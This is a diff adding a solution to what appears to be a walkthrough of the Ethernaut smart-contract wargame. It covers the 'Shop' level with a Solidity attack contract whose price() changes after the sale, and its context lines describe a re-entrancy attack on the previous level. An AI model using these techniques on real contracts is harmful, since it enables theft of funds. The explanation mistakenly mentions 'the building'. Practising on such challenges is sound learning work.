@@ -744,3 +744,36 @@ This level needs to prevent other people from withdrawing ether from the fund, t
 Looking at the level code, you can see that in the withdraw function, there is the following code: `partner.call.value(amountToSend)("");`
 
 The partner in the code can be set through the `setWithdrawPartner` function above. Therefore, as long as the partner is set as the smart contract address, you can use `Re-entrancy` to repeatedly call the withdraw function in another contract until the gas is used up and the function cannot continue to execute. 
+
+
+# 21. [Challenge 21: Shop](https://ethernaut.openzeppelin.com/level/0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB)
+
+Tasks:
+- Сan you get the item from the shop for less than the price asked?
+
+**Solution:** \
+Attack Payload:
+```
+pragma solidity ^0.7.0;
+
+contract Buyer {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function price() public view returns (uint256) {
+        return Shop(msg.sender).isSold() ? 0 : 100;
+    }
+
+    function attack() public {
+        Shop(levelInstance).buy();
+    }
+}
+```
+we created our own implementation of the `price()` method because the building references an instance of `Buyer(msg.sender)`, our `Buyer` contract can be that reference, meaning our own `price()` method can be used to return whatever we want to fulfull this level's requirements.
+
+
+
+
